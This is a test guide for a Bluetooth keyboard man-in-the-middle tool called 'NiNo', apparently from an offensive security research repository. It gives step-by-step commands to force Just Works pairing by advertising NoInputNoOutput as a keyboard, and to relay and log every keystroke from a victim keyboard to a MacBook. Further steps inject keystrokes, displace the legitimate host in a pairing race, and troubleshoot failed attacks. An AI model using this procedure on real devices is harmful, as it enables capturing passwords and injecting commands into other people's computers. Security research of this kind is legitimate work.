# NiNo MITM — Test Guide

Two phases: **offline** (no keyboard, no hardware) and **online** (live BR/EDR keyboard + MacBook required).

**Architecture (as of 2026-04-02):**
```
[Keyboard] --BT L2CAP--> [Ubuntu attacker / hci0] --BT L2CAP--> [MacBook]
                                      |
                                [keystroke log]
                                [injection]
```
The PC-facing side uses a real L2CAP server socket — not uhid. Both legs are Bluetooth over the air.

---

## Offline Tests (no hardware needed)

### 1. Unit tests — all functions

Covers: `decode_hid_report`, `make_hid_report`, `_ASCII_TO_HID` round-trip, `relay_loop` (legacy),
`relay_kb_to_pc` (true MITM forward path), `inject_to_pc` (L2CAP injection), uhid struct sizes.

```bash
cd bt-attacks/nino
python3 test_nino_offline.py
```

Expected: `Ran 37 tests ... OK`

### 2. btmgmt io-cap + CoD verification

Verifies the adapter accepts NoInputNoOutput (io-cap 3) and keyboard Class of Device (0x002540).

```bash
sudo btmgmt -i hci0 power off
sudo btmgmt -i hci0 io-cap 3
sudo btmgmt -i hci0 power on
sudo btmgmt -i hci0 info | grep -i 'settings'
sudo btmgmt -i hci0 class 0x002540
sudo btmgmt -i hci0 info | grep -i 'class'
```

Expected: `IO Capabilities successfully set`, `powered ssp br/edr` in settings, class set to `0x002540`.

### 3. uhid kernel smoke test (retained for other attack scripts)

uhid is no longer in the NiNo relay path, but is still used by WhisperPair and KNOB.
Verify it still works:

```bash
cd bt-attacks/nino
sudo python3 -c "import os,struct,time,sys; sys.path.insert(0,'.'); import nino_mitm as N; fd=os.open('/dev/uhid',os.O_RDWR); N.uhid_create(fd); time.sleep(0.5); N.uhid_destroy(fd); os.close(fd); print('uhid smoke test OK')"
sudo dmesg | grep -i 'NiNo\|uhid' | tail -5
```

Expected:
```
uhid smoke test OK
input: NiNo-MITM-Keyboard as /devices/virtual/misc/uhid/...
hid-generic ... BLUETOOTH HID v0.01 Keyboard [NiNo-MITM-Keyboard] on 0:0:0:0
```

### What offline tests confirm

| Test | What it proves |
|---|---|
| Unit tests (37) | HID decode/encode correct; relay_kb_to_pc strips 0xA1, re-adds on PC side, logs; inject_to_pc sends correct keycodes with 0xA1 header and press+release pairs |
| btmgmt io-cap | Adapter advertises NoInputNoOutput before pairing |
| btmgmt class | Adapter advertises as keyboard so MacBook discovers it |
| uhid smoke | uhid path intact for other attack scripts |

---

## Online Tests (live BR/EDR keyboard + MacBook required)

### Prerequisites

- Keyboard in pairing mode (hold pairing button until LED blinks)
- MacBook Bluetooth **disabled** for the duration of the attack window
- `hci0` up: `hciconfig hci0 up`
- Running as root on Ubuntu (or inside Docker container)
- A text editor open and focused on the MacBook for the injection test

### 4. Discover keyboard BD_ADDR and confirm HID SDP

```bash
sudo hcitool scan
```

Note the BD_ADDR (e.g. `AA:BB:CC:DD:EE:FF`). Confirm it exposes HID PSMs:

```bash
sudo sdptool browse AA:BB:CC:DD:EE:FF | grep -i 'HID\|PSM'
```

Expected: PSM 17 (0x11, Control) and PSM 19 (0x13, Interrupt).

### 5. Full two-leg MITM relay run

**Setup:** keyboard in pairing mode, MacBook BT disabled.

```bash
cd bt-attacks/nino
sudo python3 nino_mitm.py --target AA:BB:CC:DD:EE:FF
```

Expected output sequence:

```
[PAIRING] power off: ok
[PAIRING] io-cap 3: ok
[PAIRING] bondable on: ok
[PAIRING] power on: ok
[PAIRING] connectable on: ok
[PAIRING] class 0x002540: ok
[PAIRING] discoverable on: ok
[PAIRING] connectable on: ok
[MITM] Waiting for PC to connect ...
[PAIRING] Connecting to keyboard AA:BB:CC:DD:EE:FF ...
[PAIRING] ACL + pairing to AA:BB:CC:DD:EE:FF: ok
[MITM] Opening HID Control channel  (PSM 0x0011)
[MITM] Opening HID Interrupt channel (PSM 0x0013)
[MITM] Session established with AA:BB:CC:DD:EE:FF
```

At this point **re-enable MacBook Bluetooth** and pair it to the attacker (it will see a "keyboard" at the attacker's BD_ADDR). After MacBook connects:

```
[MITM] PC connected from ('E8:62:BE:42:BE:12', 17)
[MITM] Relay active — type on keyboard to see logged keystrokes
```

### 6. Verify keystroke relay in both directions

Type on the keyboard. Verify simultaneously:
- Ubuntu terminal shows `[RELAY] KEY: x` for each keystroke
- MacBook receives the keystrokes (text appears in the open text editor)

Also verify LED relay: press Caps Lock on keyboard → MacBook should reflect Caps Lock state (this confirms `relay_pc_to_kb` is working).

### 7. Verify NoInputNoOutput forced Just Works

During pairing (step 5), confirm **no passkey or numeric comparison appeared** on either the keyboard or the MacBook. The absence of any prompt is the confirmation that NiNo forced Just Works association.

### 8. Keystroke injection test

```bash
sudo python3 nino_mitm.py --target AA:BB:CC:DD:EE:FF --inject "hello world"
```

With the MacBook text editor focused, `hello world` must appear typed automatically — no keyboard touched. Terminal shows `[INJECT] 'hello world'`.

### 9. Verify MacBook displacement

Re-run step 5 without disabling MacBook BT first (MacBook attempts to connect to the keyboard concurrently). Verify:
- Ubuntu wins the pairing race (keyboard bonds with attacker first)
- MacBook fails to connect to the keyboard directly
- MacBook connects to attacker instead (after attacker advertises as keyboard)
- Relay is still transparent

### Common failures and fixes

| Symptom | Likely cause | Fix |
|---|---|---|
| `[MITM] Waiting for PC to connect ...` hangs forever | MacBook doesn't see the attacker as a keyboard | Check `sdptool browse <attacker_BD_ADDR>` from another device — HID record must be present |
| `L2CAP Control connect failed` | Keyboard already paired to MacBook | Unpair keyboard from MacBook, re-enter pairing mode |
| `L2CAP Control connect failed: [Errno 111]` | bluetoothctl connect failed | Run `bluetoothctl pair AA:BB:CC:DD:EE:FF` manually, then retry |
| MacBook pairs but relay drops immediately | macOS sends HID_SET_PROTOCOL before interrupt channel opens | Add 0.5s sleep between accepting ctrl and intr in `accept_pc_connection` |
| Relay connects but no `[RELAY] KEY` output | Keyboard uses report-mode HID, not boot-mode | Report descriptor from keyboard's SDP may show non-boot format — check byte 0 of interrupt packet |
| Keystrokes doubled on MacBook | MacBook also connected directly to keyboard | Ensure MacBook BT is off when attack starts |
| `queue.Empty` error after 60 seconds | MacBook never connected within timeout | Increase timeout in `accept_pc_connection(timeout=...)` or ensure MacBook is scanning |

---

## Test Status Log

| Date | Phase | Result | Notes |
|---|---|---|---|
| 2026-04-02 | Offline unit tests (37) | Pass | decode, round-trip, relay_kb_to_pc, inject_to_pc, uhid structs — all pass |
| 2026-04-02 | btmgmt io-cap 3 | Pass | Adapter confirmed NoInputNoOutput; Intel chip (manufacturer 2) |
| 2026-04-02 | uhid CREATE2 kernel | Pass | Virtual keyboard registered in dmesg |
| (TBD) | Online tests 4–9 | Pending | Waiting for BR/EDR keyboard + MacBook |
